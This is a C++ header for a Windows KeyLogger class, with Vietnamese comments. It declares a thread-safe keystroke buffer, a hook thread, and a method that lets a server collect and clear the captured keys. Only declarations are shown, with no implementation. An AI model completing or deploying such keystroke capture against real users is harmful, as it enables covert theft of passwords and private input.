#pragma once
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex> // THÊM: Để bảo vệ buffer

class KeyLogger {
private:
    std::vector<std::string> buffer;
    std::mutex bufferMutex; // THÊM: Mutex khóa luồng

public:
    std::thread hookThread;
    std::atomic<bool> isRunning{ false };

    // Helper format chuỗi
    std::string logKeystroke(int key);

    // Hàm nhận phím từ Hook gửi vào (Thread Safe)
    void OnKeyPressed(int key);

    // Hàm để Server lấy dữ liệu ra và xóa buffer (Thread Safe)
    std::vector<std::string> GetAndClearLogs();

    void WorkerThread();
    void Start();
    void Stop();
};